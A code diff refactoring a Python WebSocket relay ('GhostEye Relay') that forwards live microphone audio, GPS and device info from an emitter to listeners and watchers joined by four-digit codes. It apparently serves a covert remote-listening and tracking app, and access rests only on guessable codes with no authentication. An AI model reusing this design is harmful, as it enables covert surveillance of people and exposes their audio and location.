@@ -5,16 +5,56 @@ import random
 import string
 import os
 
-emitters  = {}   # code -> ghosteye ws
-listeners = {}   # code -> specter ws (JOIN audio)
-watchers  = {}   # code -> set de ws en modo WATCH
-last_info = {}   # code -> ultimo INFO recibido
+emitters  = {}
+listeners = {}
+watchers  = {}
+last_info = {}
 
 def gen_code():
     while True:
         code = ''.join(random.choices(string.digits, k=4))
         if code not in emitters:
             return code
+
+async def safe_send_str(ws, msg):
+    try:
+        if not ws.closed:
+            await ws.send_str(msg)
+            return True
+    except Exception:
+        pass
+    return False
+
+async def safe_send_bytes(ws, data):
+    try:
+        if not ws.closed:
+            await ws.send_bytes(data)
+            return True
+    except Exception:
+        pass
+    return False
+
+async def cleanup_code(code, role, ws):
+    """Limpieza centralizada — siempre se ejecuta"""
+    if role == "EMIT":
+        if emitters.get(code) is ws:
+            emitters.pop(code, None)
+        # Notificar listener
+        listener = listeners.get(code)
+        if listener and not listener.closed:
+            await safe_send_str(listener, "EMITTER_GONE")
+
+    elif role == "JOIN":
+        if listeners.get(code) is ws:
+            listeners.pop(code, None)
+        # Parar micrófono
+        emitter = emitters.get(code)
+        if emitter and not emitter.closed:
+            await safe_send_str(emitter, "STOP")
+
+    elif role == "WATCH":
+        if code in watchers:
+            watchers[code].discard(ws)
 
 async def handle_ping(request):
     return web.Response(text="GhostEye Relay OK", status=200)
@@ -34,17 +74,25 @@ async def self_ping(app):
             pass
 
 async def handle(request):
-    # ✅ heartbeat=10 — detecta zombies en 10s
-    ws = web.WebSocketResponse(heartbeat=10)
+    # ✅ heartbeat=15 — detecta zombies, no tan agresivo
+    ws = web.WebSocketResponse(heartbeat=15)
     await ws.prepare(request)
     code = None
     role = None
 
     try:
-        msg = await asyncio.wait_for(ws.receive(), timeout=10)
-        if msg.type != aiohttp.WSMsgType.TEXT:
+        # Timeout inicial para recibir el primer mensaje
+        try:
+            msg = await asyncio.wait_for(ws.receive(), timeout=15)
+        except asyncio.TimeoutError:
+            await ws.close()
             return ws
-        text = msg.data
+
+        if msg.type != aiohttp.WSMsgType.TEXT:
+            await ws.close()
+            return ws
+
+        text = msg.data.strip()
 
         # ── GHOSTEYE 2 emisor ──
         if text == "EMIT" or text.startswith("EMIT:"):
@@ -56,73 +104,64 @@ async def handle(request):
                 code = gen_code()
 
             role = "EMIT"
+
+            # Cerrar emisor anterior si existe
+            old = emitters.get(code)
+            if old and not old.closed:
+                try:
+                    await old.close()
+                except Exception:
+                    pass
+
             emitters[code] = ws
             if code not in watchers:
                 watchers[code] = set()
-            await ws.send_str(f"CODE:{code}")
 
-            # ✅ Si Specter ya está esperando — enviar READY inmediatamente
+            await safe_send_str(ws, f"CODE:{code}")
+
+            # ✅ Si Specter ya está esperando — READY inmediato
             listener = listeners.get(code)
             if listener and not listener.closed:
-                try:
-                    await ws.send_str("READY")
-                except Exception:
-                    pass
+                await safe_send_str(ws, "READY")
 
             async for msg in ws:
                 if msg.type == aiohttp.WSMsgType.BINARY:
                     listener = listeners.get(code)
                     if listener and not listener.closed:
-                        try:
-                            await listener.send_bytes(msg.data)
-                        except Exception:
+                        ok = await safe_send_bytes(listener, msg.data)
+                        if not ok:
                             listeners.pop(code, None)
 
                 elif msg.type == aiohttp.WSMsgType.TEXT:
                     txt = msg.data
                     if txt.startswith("INFO|"):
                         last_info[code] = txt
-                        # Reenviar al listener
                         listener = listeners.get(code)
                         if listener and not listener.closed:
-                            try:
-                                await listener.send_str(txt)
-                            except Exception:
-                                listeners.pop(code, None)
-                        # Reenviar a watchers
-                        dead = set()
-                        for w in list(watchers.get(code, set())):
-                            if w.closed:
-                                dead.add(w)
-                                continue
-                            try:
-                                await w.send_str(txt)
-                            except Exception:
-                                dead.add(w)
-                        watchers.get(code, set()).difference_update(dead)
-                    elif txt.startswith("GPS|"):
-                        listener = listeners.get(code)
-                        if listener and not listener.closed:
-                            try:
-                                await listener.send_str(txt)
-                            except Exception:
+                            ok = await safe_send_str(listener, txt)
+                            if not ok:
                                 listeners.pop(code, None)
                         dead = set()
                         for w in list(watchers.get(code, set())):
                             if w.closed:
-                                dead.add(w); continue
-                            try:
-                                await w.send_str(txt)
-                            except Exception:
                                 dead.add(w)
+                            else:
+                                ok = await safe_send_str(w, txt)
+                                if not ok:
+                                    dead.add(w)
                         watchers.get(code, set()).difference_update(dead)
+
+                    elif txt.startswith("GPS|") or txt == "GET_INFO":
+                        listener = listeners.get(code)
+                        if listener and not listener.closed:
+                            await safe_send_str(listener, txt)
+                        for w in list(watchers.get(code, set())):
+                            if not w.closed:
+                                await safe_send_str(w, txt)
                     else:
                         listener = listeners.get(code)
                         if listener and not listener.closed:
-                            try:
-                                await listener.send_str(txt)
-                            except Exception:
-                                listeners.pop(code, None)
+                            await safe_send_str(listener, txt)
 
                 elif msg.type in (aiohttp.WSMsgType.CLOSE, aiohttp.WSMsgType.ERROR):
                     break
@@ -131,44 +170,37 @@ async def handle(request):
         elif text.startswith("JOIN:"):
             code = text[5:].strip()
             if code not in emitters:
-                await ws.send_str("ERROR:INVALID_CODE")
+                await safe_send_str(ws, "ERROR:INVALID_CODE")
+                await ws.close()
                 return ws
 
             role = "JOIN"
 
-            # ✅ Limpiar listener zombie anterior si existe
-            old_listener = listeners.get(code)
-            if old_listener and not old_listener.closed:
+            # Cerrar listener anterior zombie
+            old = listeners.get(code)
+            if old and not old.closed:
                 try:
-                    await old_listener.close()
+                    await old.close()
                 except Exception:
                     pass
-            listeners[code] = ws
-            await ws.send_str("OK")
 
-            # ✅ Enviar READY inmediatamente si emisor está conectado
+            listeners[code] = ws
+            await safe_send_str(ws, "OK")
+
+            # ✅ READY inmediato
             emitter = emitters.get(code)
             if emitter and not emitter.closed:
-                try:
-                    await emitter.send_str("READY")
-                except Exception:
-                    emitters.pop(code, None)
+                await safe_send_str(emitter, "READY")
 
-            # ✅ Enviar último INFO guardado inmediatamente
+            # ✅ Último INFO inmediato
             if code in last_info:
-                try:
-                    await ws.send_str(last_info[code])
-                except Exception:
-                    pass
+                await safe_send_str(ws, last_info[code])
 
             async for msg in ws:
                 if msg.type == aiohttp.WSMsgType.TEXT:
                     emitter = emitters.get(code)
                     if emitter and not emitter.closed:
-                        try:
-                            await emitter.send_str(msg.data)
-                        except Exception:
-                            emitters.pop(code, None)
+                        await safe_send_str(emitter, msg.data)
                 elif msg.type in (aiohttp.WSMsgType.CLOSE, aiohttp.WSMsgType.ERROR):
                     break
 
@@ -176,61 +208,42 @@ async def handle(request):
         elif text.startswith("WATCH:"):
             code = text[6:].strip()
             if code not in emitters:
-                await ws.send_str("ERROR:INVALID_CODE")
+                await safe_send_str(ws, "ERROR:INVALID_CODE")
+                await ws.close()
                 return ws
 
             role = "WATCH"
             if code not in watchers:
                 watchers[code] = set()
             watchers[code].add(ws)
-            await ws.send_str("WATCHING")
+            await safe_send_str(ws, "WATCHING")
 
-            # ✅ Enviar último INFO guardado inmediatamente
             if code in last_info:
-                try:
-                    await ws.send_str(last_info[code])
-                except Exception:
-                    pass
+                await safe_send_str(ws, last_info[code])
 
-            # Pedir info actualizada
             emitter = emitters.get(code)
             if emitter and not emitter.closed:
-                try:
-                    await emitter.send_str("GET_INFO")
-                except Exception:
-                    pass
+                await safe_send_str(emitter, "GET_INFO")
 
             async for msg in ws:
                 if msg.type in (aiohttp.WSMsgType.CLOSE, aiohttp.WSMsgType.ERROR):
                     break
 
+        else:
+            await ws.close()
+            return ws
+
     except Exception as e:
-        print(f"Error: {e}")
+        print(f"Error handle [{role}][{code}]: {e}")
     finally:
-        # ✅ SIEMPRE limpiar al desconectar — elimina zombies
-        if role == "EMIT" and code:
-            emitters.pop(code, None)
-            # Notificar a listener que emisor se fue
-            listener = listeners.get(code)
-            if listener and not listener.closed:
-                try:
-                    await listener.send_str("EMITTER_GONE")
-                except Exception:
-                    pass
-
-        elif role == "JOIN" and code:
-            listeners.pop(code, None)
-            # Parar micrófono de GhostEye 2
-            emitter = emitters.get(code)
-            if emitter and not emitter.closed:
-                try:
-                    await emitter.send_str("STOP")
-                except Exception:
-                    pass
-
-        elif role == "WATCH" and code:
-            if code in watchers:
-                watchers[code].discard(ws)
+        # ✅ Limpieza SIEMPRE — nunca zombie
+        if code and role:
+            await cleanup_code(code, role, ws)
+        if not ws.closed:
+            try:
+                await ws.close()
+            except Exception:
+                pass
 
     return ws
 
@@ -244,7 +257,7 @@ async def main():
     await runner.setup()
     site = web.TCPSite(runner, "0.0.0.0", port)
     await site.start()
-    print(f"Relay PRO corriendo en puerto {port}")
+    print(f"Relay PRO v2 corriendo en puerto {port}")
     asyncio.ensure_future(self_ping(app))
     await asyncio.Future()
 
